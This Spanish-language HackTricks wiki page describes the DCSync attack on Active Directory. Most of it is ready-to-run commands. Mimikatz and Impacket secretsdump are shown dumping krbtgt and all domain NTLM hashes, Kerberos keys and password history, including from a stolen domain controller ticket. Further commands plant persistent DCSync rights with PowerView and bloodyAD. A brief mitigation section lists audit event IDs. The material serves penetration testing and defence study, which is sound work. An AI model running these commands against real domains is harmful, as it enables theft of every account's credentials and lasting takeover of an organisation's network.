# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.

**Notas importantes sobre DCSync:**

- El ataque **DCSync simula el comportamiento de un Domain Controller y pide a otros Domain Controllers que repliquen información** usando el Directory Replication Service Remote Protocol (MS-DRSR). Como MS-DRSR es una función válida y necesaria de Active Directory, no se puede apagar ni deshabilitar.
- Por defecto, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios requeridos.
- En la práctica, un **DCSync completo** necesita **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** sobre el domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales / filtrados por RODC** (por ejemplo, secretos antiguos al estilo LAPS) que para un volcado completo de krbtgt.
- Si alguna contraseña de cuenta se almacena con cifrado reversible, existe una opción en Mimikatz para devolver la contraseña en texto claro

### Enumeration

Comprueba quién tiene estos permisos usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Si quieres centrarte en **non-default principals** con permisos DCSync, filtra los grupos integrados con capacidad de replicación y revisa solo los trustees inesperados:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Remotely
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Ejemplos prácticos acotados:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

En escenarios de modo de exportación de unconstrained-delegation, puedes capturar un Domain Controller machine TGT (por ejemplo, `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Luego puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin una contraseña.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas operativas:

- **La ruta Kerberos de Impacket toca SMB primero** antes de la llamada DRSUAPI. Si el entorno aplica **SPN target name validation**, un volcado completo puede fallar con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- En ese caso, solicita primero un ticket de servicio **`cifs/<dc>`** para el DC objetivo o recurre a **`-just-dc-user`** para la cuenta que necesites de inmediato.
- Cuando solo tienes derechos de replicación más bajos, la sincronización estilo LDAP/DirSync aún puede exponer atributos **confidential** o **RODC-filtered** (por ejemplo, el antiguo `ms-Mcs-AdmPwd`) sin una replicación completa de krbtgt.

`-just-dc` genera 3 archivos:

- uno con los **NTLM hashes**
- uno con las **Kerberos keys**
- uno con las contraseñas en texto claro de NTDS para cualquier cuenta con [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Puedes obtener los usuarios con reversible encryption con

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Si eres domain admin, puedes conceder estos permisos a cualquier usuario con la ayuda de `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Los operadores de Linux pueden hacer lo mismo con `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Entonces, puedes **comprobar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en la salida de (deberías poder ver los nombres de los privilegios dentro del campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

- Security Event ID 4662 (Audit Policy for object must be enabled) – Se realizó una operación en un objeto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Se modificó un objeto de servicio de directorio
- Security Event ID 4670 (Audit Policy for object must be enabled) – Se cambiaron los permisos en un objeto
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
